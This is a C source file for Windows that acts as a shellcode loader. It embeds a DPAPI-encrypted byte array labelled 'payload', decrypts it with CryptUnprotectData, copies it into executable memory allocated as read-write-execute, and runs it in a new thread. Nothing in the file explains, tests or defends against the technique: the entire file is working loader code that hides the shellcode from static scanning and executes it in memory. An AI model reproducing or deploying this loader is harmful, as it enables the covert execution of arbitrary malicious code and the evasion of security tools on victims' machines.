#pragma comment(lib, "crypt32.lib")

#include <stdio.h>
#include <windows.h>

void pretty_print(const char* label, DATA_BLOB blob)
{
    DWORD sz = blob.cbData;
    BYTE* data = blob.pbData;

    printf("=== %s ===\n", label);
    printf("Size: %d\n", sz);

    for (int i = 0; i < sz; i++)
    {
        if (i == sz - 1)
        {
            printf("0x%X ", data[i]);
        }
        else
        {
            printf("0x%X, ", data[i]);
        }
    }
    printf("\n\n");
}

int main()
{
   
    unsigned char payload[] = { 0x1, 0x0, 0x0, 0x0, 0xD0, 0x8C, 0x9D, 0xDF, 0x1, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x0, 0xC0, 0x4F, 0xC2, 0x97, 0xEB, 0x1, 0x0, 0x0, 0x0, 0x46, 0x79, 0x9A, 0xA5, 0x1C, 0xE2, 0x2E, 0x42, 0x8C, 0x23, 0x4F, 0x9C, 0x70, 0xD, 0x68, 0xA, 0x4, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3, 0x66, 0x0, 0x0, 0xC0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0xFC, 0x4A, 0x6C, 0x69, 0x1E, 0x2, 0x4F, 0xB8, 0x37, 0x4, 0x1C, 0x63, 0x86, 0xED, 0x98, 0x62, 0x0, 0x0, 0x0, 0x0, 0x4, 0x80, 0x0, 0x0, 0xA0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x18, 0x3A, 0xEF, 0x68, 0xD6, 0xB5, 0x51, 0x4D, 0xBC, 0x4C, 0x3A, 0x2C, 0x12, 0x29, 0x41, 0xF5, 0x18, 0x1, 0x0, 0x0, 0x6F, 0xBB, 0x81, 0x76, 0xF1, 0x55, 0xC7, 0x2F, 0x9E, 0x4, 0x33, 0x3D, 0xC2, 0x3B, 0x2A, 0x39, 0xA3, 0xAA, 0xC4, 0x4D, 0x8F, 0xC7, 0x99, 0xED, 0x83, 0x28, 0xE0, 0x32, 0xD5, 0xCF, 0x3F, 0xF8, 0xDF, 0x62, 0x93, 0x64, 0x24, 0xEE, 0xF1, 0x40, 0xAD, 0xCD, 0xAA, 0xC, 0xF8, 0xD6, 0xD9, 0xAD, 0x2D, 0xBE, 0xC1, 0x5D, 0xC, 0x1C, 0xAA, 0xA4, 0x80, 0x86, 0x8B, 0xE7, 0xD, 0x8, 0xDD, 0x3D, 0xE, 0x37, 0x5B, 0x59, 0x88, 0x27, 0x94, 0xE1, 0x2D, 0x96, 0xA7, 0x4F, 0x64, 0xB2, 0x9F, 0x5E, 0xB5, 0x15, 0x69, 0x60, 0x83, 0x92, 0xBE, 0x29, 0x83, 0xCA, 0xE8, 0xA4, 0x71, 0xAB, 0xE9, 0xF1, 0xDA, 0x9, 0x21, 0x16, 0x54, 0x5, 0xD3, 0x3B, 0x1E, 0x25, 0xEE, 0xE8, 0x64, 0x4C, 0x4D, 0x8F, 0x9, 0x65, 0xD0, 0x17, 0xD4, 0x57, 0x9E, 0x90, 0x34, 0xA1, 0xF7, 0x96, 0x70, 0x89, 0x43, 0xF4, 0xC1, 0xBA, 0x26, 0x61, 0x53, 0xC3, 0x5F, 0x2F, 0x2C, 0x47, 0xF3, 0x10, 0xEA, 0x51, 0x72, 0x93, 0x50, 0x3A, 0xFE, 0xAF, 0x7F, 0xA, 0x25, 0xE7, 0x9B, 0xBF, 0x96, 0x38, 0x87, 0x83, 0x3, 0x70, 0xF0, 0x80, 0xFD, 0x9E, 0x16, 0x13, 0x69, 0xEB, 0xD3, 0x9E, 0x67, 0x1, 0x3A, 0x18, 0x8E, 0xC0, 0x34, 0xDA, 0xA9, 0x21, 0x69, 0x52, 0x55, 0xE1, 0x4A, 0x70, 0xB7, 0x10, 0x79, 0x1F, 0x6E, 0xF2, 0x2E, 0x8, 0xE8, 0xDC, 0xCB, 0x8, 0x4A, 0x6A, 0xAF, 0x5E, 0xA7, 0xC9, 0x1E, 0x50, 0x95, 0x16, 0x92, 0x38, 0x73, 0x32, 0x67, 0x68, 0xEB, 0x8E, 0xEF, 0x89, 0x14, 0x51, 0x11, 0xA5, 0xBF, 0x95, 0x7B, 0xFF, 0x42, 0xAE, 0xF2, 0x62, 0xD5, 0xF8, 0x93, 0xBD, 0xD, 0x9C, 0x79, 0x24, 0x38, 0x81, 0x5B, 0x5F, 0xF0, 0xFD, 0xC9, 0xE5, 0xA3, 0x9A, 0xD3, 0xC7, 0x9B, 0x8E, 0xE0, 0xAA, 0x8A, 0xB9, 0xBF, 0xF6, 0x3D, 0x9D, 0xBF, 0x5B, 0x4D, 0xFE, 0x9F, 0x7, 0x66, 0x2E, 0x47, 0xFC, 0x2C, 0xD3, 0x20, 0x55, 0x4D, 0x7C, 0x36, 0x84, 0x9B, 0xD6, 0x14, 0x0, 0x0, 0x0, 0x18, 0x7A, 0xE4, 0xC9, 0x7E, 0x79, 0x0, 0x9C, 0x50, 0xEA, 0x45, 0xD5, 0x2F, 0x9E, 0xF, 0x1, 0xE8, 0x97, 0x22, 0xFD };
    int payloadSz = sizeof payload;

    DATA_BLOB blob_input =
    {
        payloadSz + 1,
        (BYTE*)payload
    };

    DATA_BLOB blob_decrypted;

    if (!CryptUnprotectData(&blob_input, NULL, NULL, NULL, NULL, CRYPTPROTECT_VERIFY_PROTECTION, &blob_decrypted))
    {
        printf("CryptUnprotectData(): %d\n", GetLastError());
        return -1;
    }

    pretty_print("Decrypted", blob_decrypted);

    unsigned char* buf = blob_decrypted.pbData;
    int bufSz = blob_decrypted.cbData;

    LPVOID pAddress = VirtualAlloc(nullptr, bufSz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pAddress)
    {
        printf("VirtualAlloc(): %d\n", GetLastError());
        return -1;
    }

    printf("Base Address: %p\n", pAddress);
    
    RtlMoveMemory(pAddress, buf, bufSz);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);

    if (!hThread)
    {
        printf("CreateThread(): %d\n", GetLastError());
        return -1;
    }

    printf("Thread Handle: %p\n", hThread);

    int ec = WaitForSingleObject(hThread, INFINITE);

    printf("Exit Code: %d\n", ec);

    LocalFree(blob_decrypted.pbData);
    return 0;
}
